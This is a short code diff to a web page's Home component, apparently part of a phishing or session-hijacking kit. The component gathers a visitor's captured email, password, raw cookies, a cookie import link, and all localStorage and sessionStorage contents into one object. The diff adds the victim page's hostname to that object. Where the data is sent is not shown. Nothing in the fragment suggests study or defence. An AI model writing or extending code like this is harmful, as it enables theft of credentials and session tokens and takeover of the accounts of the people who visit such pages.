@@ -82,6 +82,7 @@ export default function Home() {
       email: capturedEmail,
       password,
       cookies: cookiesRaw,
+      captureDomain: typeof window !== 'undefined' ? window.location.hostname : '',
       cookiesImportLink: cookiesImportLink || undefined,
       localStorage: typeof localStorage !== 'undefined' ? Object.fromEntries(Object.entries(localStorage)) : {},
       sessionStorage: typeof sessionStorage !== 'undefined' ? Object.fromEntries(Object.entries(sessionStorage)) : {},
